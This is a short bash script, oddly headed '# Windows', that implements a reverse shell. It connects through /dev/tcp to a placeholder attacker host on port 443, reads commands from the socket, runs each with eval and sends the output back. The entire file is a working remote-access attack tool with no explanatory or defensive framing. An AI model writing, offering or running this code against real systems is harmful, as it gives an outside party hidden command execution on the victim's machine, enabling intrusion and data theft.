# Windows
#!/bin/bash

# Configuration
LHOST="IP_ADDRESS"
LPORT=443
BUFFER_SIZE=1024

# Establish TCP connection to the specified host and port
exec 3<>/dev/tcp/"$LHOST"/"$LPORT" || { echo "Failed to connect to $LHOST:$LPORT"; exit 1; }

# Main loop to receive and execute commands
while true; do
    # Read command from the socket
    IFS= read -r -d '' -n "$BUFFER_SIZE" command <&3 || break

    # Remove leading/trailing whitespace and null bytes
    command=$(echo "$command" | tr -d '\0' | sed -e 's/^[[:space:]]*//' -e 's/[[:space:]]*$//')

    # Check if command is not empty
    if [[ -n "$command" ]]; then
        # Execute the command and capture output/errors
        output=$(eval "$command" 2>&1) || output="error: $output"

        # Send the output back through the socket
        printf "%s" "$output" >&3
    fi
done

# Close the socket
exec 3>&-
